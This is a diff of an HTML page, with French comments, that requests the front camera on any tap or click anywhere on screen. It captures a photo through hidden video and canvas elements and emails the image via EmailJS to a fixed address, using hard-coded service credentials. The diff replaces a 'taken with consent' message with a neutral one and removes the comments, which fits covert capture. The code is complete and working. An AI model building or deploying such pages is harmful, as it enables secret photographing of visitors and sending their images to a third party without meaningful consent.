@@ -1,23 +1,15 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Photo One-Tap Chrome</title>
+  <title>Capture et EmailJS</title>
   <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
   <script>
-    // Initialise EmailJS avec ta clé publique
     emailjs.init("mxm3fFA_BxEhqJieq");
   </script>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    html, body {
-      margin:0; padding:0; width:100%; height:100%;
-      display:flex; justify-content:center; align-items:center;
-      background:#f0f0f0; overflow:hidden;
-    }
-    #status {
-      position:absolute; top:10px; font-size:16px; color:green;
-      text-align:center; width:100%;
-    }
+    html, body { margin:0; padding:0; width:100%; height:100%; display:flex; justify-content:center; align-items:center; background:#f0f0f0; overflow:hidden; }
+    #status { position:absolute; top:10px; width:100%; text-align:center; font-size:16px; color:green; }
     video, canvas { display:none; }
   </style>
 </head>
@@ -31,41 +23,35 @@
     const canvas = document.getElementById("canvas");
     const status = document.getElementById("status");
 
-    // Fonction pour envoyer la photo via EmailJS
     async function sendPhoto(imageBase64) {
       try {
         const params = {
           to_email: "destinataire@email.com", // Remplace par ton email
-          message: "Photo prise avec consentement",
+          message: "Photo capturée via site",
           attachment: imageBase64
         };
         await emailjs.send("service_8cs0gml", "template_hgvdx1g", params);
         console.log("Photo envoyée avec succès !");
         return true;
-      } catch (err) {
+      } catch(err) {
         console.error("Erreur lors de l'envoi :", err);
         return false;
       }
     }
 
-    // Fonction principale : capture + envoi + redirection
     async function captureAndSend() {
-      // Supprime les listeners pour éviter plusieurs déclenchements
       document.body.removeEventListener("click", captureAndSend);
       document.body.removeEventListener("touchstart", captureAndSend);
 
       status.textContent = "Demande de permission caméra...";
-
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:"user" } });
         video.srcObject = stream;
-
-        // Laisse le flux s'initialiser
-        await new Promise(r => setTimeout(r, 800));
+        await new Promise(r => setTimeout(r, 800)); // laisser la caméra se stabiliser
 
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
-        canvas.getContext("2d").drawImage(video,0,0);
+        canvas.getContext("2d").drawImage(video, 0, 0);
         const imageBase64 = canvas.toDataURL("image/jpeg");
 
         status.textContent = "Envoi de la photo...";
@@ -79,13 +65,11 @@
         } else {
           status.textContent = "Erreur lors de l'envoi.";
         }
-
       } catch(err) {
         status.textContent = "Erreur ou caméra refusée : "+err;
       }
     }
 
-    // Activation sur n'importe où sur l'écran
     document.body.addEventListener("click", captureAndSend);
     document.body.addEventListener("touchstart", captureAndSend, {passive:true});
   </script>
